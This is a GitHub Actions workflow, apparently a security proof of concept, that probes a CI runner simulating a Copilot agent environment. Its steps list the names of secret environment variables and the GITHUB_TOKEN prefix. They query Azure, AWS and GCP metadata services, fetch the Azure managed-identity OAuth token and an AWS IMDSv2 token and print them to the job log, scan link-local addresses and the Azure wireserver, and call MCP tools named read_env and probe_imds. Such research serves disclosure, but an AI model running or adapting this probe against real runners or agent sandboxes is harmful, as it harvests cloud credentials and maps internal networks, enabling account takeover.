name: SSRF Probe Test (Simulates Copilot Agent Environment)

on:
  workflow_dispatch:
    inputs:
      probe_target:
        description: 'Probe target: all, aws, gcp, azure'
        required: false
        default: 'all'

jobs:
  copilot-environment-probe:
    runs-on: ubuntu-latest
    environment: copilot
    steps:
      - name: Environment recon
        run: |
          echo "=== PHASE 1: ENVIRONMENT PROBE ==="
          echo ""
          echo "--- Hostname and network identity ---"
          hostname
          hostname -I 2>/dev/null || ip addr show 2>/dev/null | grep "inet " || true
          cat /etc/resolv.conf 2>/dev/null | head -5 || true

          echo ""
          echo "--- Environment variables (keys only, values redacted) ---"
          env | grep -iE '(GITHUB|ACTIONS|AWS|GCP|AZURE|TOKEN|SECRET|KEY|CREDENTIAL|PASSWORD|RUNNER)' \
            | sed 's/=.*$/=[REDACTED-FOR-PoC]/' \
            || echo "No sensitive env vars found"

          echo ""
          echo "--- GITHUB_TOKEN scope check ---"
          if [ -n "$GITHUB_TOKEN" ]; then
            TOKEN_LEN=${#GITHUB_TOKEN}
            TOKEN_PREFIX=${GITHUB_TOKEN:0:4}
            echo "[CONFIRMED] GITHUB_TOKEN present ($TOKEN_LEN chars, prefix: $TOKEN_PREFIX...)"
          else
            echo "[INFO] GITHUB_TOKEN not set in env"
          fi

      - name: Azure IMDS probe (primary - runner is Azure VM)
        continue-on-error: true
        run: |
          echo "=== AZURE IMDS PROBE ==="
          echo ""

          echo "--- Azure Instance Metadata ---"
          echo "Target: http://169.254.169.254/metadata/instance?api-version=2021-02-01"
          RESPONSE=$(curl -s --max-time 5 --connect-timeout 3 \
            -H "Metadata: true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1) || true

          if [ -n "$RESPONSE" ]; then
            echo "[CONFIRMED] Azure IMDS reachable!"
            echo "Response (first 2000 chars):"
            echo "$RESPONSE" | head -c 2000
            echo ""
          else
            echo "[RESULT] Azure IMDS not reachable or empty response"
          fi

          echo ""
          echo "--- Azure Identity Token ---"
          echo "Target: http://169.254.169.254/metadata/identity/oauth2/token"
          TOKEN_RESP=$(curl -s --max-time 5 --connect-timeout 3 \
            -H "Metadata: true" \
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1) || true

          if [ -n "$TOKEN_RESP" ]; then
            echo "[RESPONSE] Azure identity token endpoint:"
            echo "$TOKEN_RESP" | head -c 1000
          else
            echo "[RESULT] Azure identity token not reachable"
          fi

          echo ""
          echo "--- Azure Scheduledevents ---"
          SCHED=$(curl -s --max-time 5 --connect-timeout 3 \
            -H "Metadata: true" \
            "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" 2>&1) || true
          echo "Scheduledevents: ${SCHED:-NOT_REACHABLE}"

          echo ""
          echo "--- Azure Attested Data ---"
          ATTEST=$(curl -s --max-time 5 --connect-timeout 3 \
            -H "Metadata: true" \
            "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01" 2>&1) || true
          echo "Attested (first 500 chars): $(echo "$ATTEST" | head -c 500)"

      - name: AWS IMDS probe (secondary check)
        continue-on-error: true
        run: |
          echo "=== AWS IMDS PROBE ==="
          echo "Target: http://169.254.169.254/latest/meta-data/"

          RESPONSE=$(curl -s --max-time 5 --connect-timeout 3 \
            "http://169.254.169.254/latest/meta-data/" 2>&1) || true

          echo "Response:"
          echo "$RESPONSE" | head -c 500
          echo ""

          echo "--- IMDSv2 Token attempt ---"
          IMDSV2_TOKEN=$(curl -s --max-time 5 -X PUT \
            -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
            "http://169.254.169.254/latest/api/token" 2>&1) || true
          echo "IMDSv2 token response: $(echo "$IMDSV2_TOKEN" | head -c 200)"

      - name: GCP metadata probe
        continue-on-error: true
        run: |
          echo "=== GCP METADATA PROBE ==="
          RESPONSE=$(curl -s --max-time 5 --connect-timeout 3 \
            -H "Metadata-Flavor: Google" \
            "http://metadata.google.internal/computeMetadata/v1/instance/zone" 2>&1) || true
          echo "GCP response: ${RESPONSE:-DNS_FAILED_OR_UNREACHABLE}"

      - uses: actions/checkout@v4

      - name: MCP server test with read_env
        continue-on-error: true
        run: |
          echo "=== MCP SERVER TEST ==="
          node --version

          INIT='{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","clientInfo":{"name":"test","version":"1"},"capabilities":{}}}'
          LIST='{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}'
          ENV_CALL='{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"read_env","arguments":{}}}'

          echo "--- read_env tool result ---"
          printf '%s\n%s\n%s\n' "$INIT" "$LIST" "$ENV_CALL" | timeout 10 node mcp-server.js 2>/dev/null | tail -1 | python3 -m json.tool 2>&1 || echo "read_env test failed"

      - name: MCP server test with probe_imds
        continue-on-error: true
        run: |
          INIT='{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","clientInfo":{"name":"test","version":"1"},"capabilities":{}}}'
          LIST='{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}'
          IMDS_CALL='{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"probe_imds","arguments":{"target":"all"}}}'

          echo "--- probe_imds tool result ---"
          printf '%s\n%s\n%s\n' "$INIT" "$LIST" "$IMDS_CALL" | timeout 30 node mcp-server.js 2>/dev/null | tail -1 | python3 -m json.tool 2>&1 || echo "probe_imds test failed"

      - name: Network and internal access probe
        continue-on-error: true
        run: |
          echo "=== NETWORK PROBE ==="

          echo "--- Network interfaces ---"
          ip addr show 2>/dev/null | grep -E "inet |link/" || true

          echo ""
          echo "--- DNS resolv.conf ---"
          cat /etc/resolv.conf 2>/dev/null || true

          echo ""
          echo "--- Internal IP ranges scan (169.254.x.x) ---"
          for ip in 169.254.169.254 169.254.169.1 169.254.169.2 169.254.169.3; do
            RESULT=$(curl -s --max-time 2 --connect-timeout 1 "http://$ip/" 2>&1) || true
            echo "$ip: ${RESULT:0:100}"
          done

          echo ""
          echo "--- Wireserver (168.63.129.16) ---"
          WIRE=$(curl -s --max-time 3 --connect-timeout 2 "http://168.63.129.16/" 2>&1) || true
          echo "Wireserver: ${WIRE:0:200}"

          echo ""
          echo "--- GitHub API meta ---"
          curl -s --max-time 5 "https://api.github.com/meta" 2>&1 | python3 -c "
          import sys,json
          try:
            d=json.load(sys.stdin)
            print(f'GitHub API: reachable')
            print(f'Verifiable password auth: {d.get(\"verifiable_password_authentication\", \"N/A\")}')
          except: print('GitHub API: parse error or unreachable')
          " || true
